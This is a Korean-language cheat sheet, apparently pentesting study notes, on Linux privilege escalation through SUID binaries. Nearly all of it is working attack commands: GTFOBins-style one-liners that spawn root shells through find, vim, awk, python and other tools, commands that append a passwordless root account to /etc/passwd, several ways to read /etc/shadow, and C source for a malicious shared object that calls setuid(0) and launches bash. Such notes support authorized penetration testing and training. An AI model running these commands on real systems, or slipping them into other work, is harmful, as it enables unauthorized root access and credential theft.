# 03_SUID악용

# 리눅스 권한상승 — SUID 악용

---

## SUID 파일 찾기

```bash
find / -perm -4000 -type f 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

---

## GTFOBins — SUID 섹션

https://gtfobins.github.io → SUID 필터 선택

```bash
# find
find . -exec /bin/sh -p \; -quit

# bash
/bin/bash -p

# vim
vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset;exec sh -p")'
vim.tiny -c ':!/bin/sh'

# more / less
more /etc/profile     # !sh
less /etc/profile     # !sh

# nmap (구버전)
nmap --interactive
# nmap> !sh

# awk
awk 'BEGIN {system("/bin/sh -p")}'

# python
python3 -c 'import os; os.execl("/bin/sh","sh","-p")'

# perl
perl -e 'exec "/bin/sh -p"'

# cp (임의 파일 복사)
# /etc/passwd 교체
cp /etc/passwd /tmp/passwd.bak
openssl passwd -1 -salt hack pass123
echo 'hacker:$1$hack$HASH:0:0:root:/root:/bin/bash' > /tmp/evil
cp /tmp/evil /etc/passwd
su hacker

# tee (파일 쓰기)
echo 'hacker::0:0:root:/root:/bin/bash' | tee -a /etc/passwd
su hacker

# cat (파일 읽기)
# /etc/shadow 읽기 가능 → 크랙

# xxd (파일 읽기)
xxd /etc/shadow | xxd -r

# head / tail (파일 읽기)
head -n 100 /etc/shadow

# openssl (파일 읽기)
openssl enc -in /etc/shadow

# curl (파일 읽기/쓰기)
curl file:///etc/shadow
echo 'root::0:0:root:/root:/bin/bash' | curl -T - file:///etc/passwd
```

---

## 커스텀 바이너리 분석

SUID 비트가 있는 비표준 바이너리 발견 시

```bash
# strings로 내부 명령어 확인
strings /usr/local/bin/custom_binary

# strace로 시스템 콜 추적
strace /usr/local/bin/custom_binary 2>&1 | grep -E "open|read|exec"

# ltrace로 라이브러리 콜 추적
ltrace /usr/local/bin/custom_binary 2>&1

# 절대경로 없이 명령 실행하는지 확인 → PATH 조작 가능
```

---

## shared object 인젝션

SUID 바이너리가 없는 .so 파일을 로드하려 할 때

```bash
# 없는 라이브러리 찾기
strace /usr/local/bin/suid_binary 2>&1 | grep "No such file"
# → /home/user/.config/libfoo.so: No such file or directory

# 악성 .so 생성
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /home/user/.config/libfoo.so /tmp/evil.c

# 실행
/usr/local/bin/suid_binary
```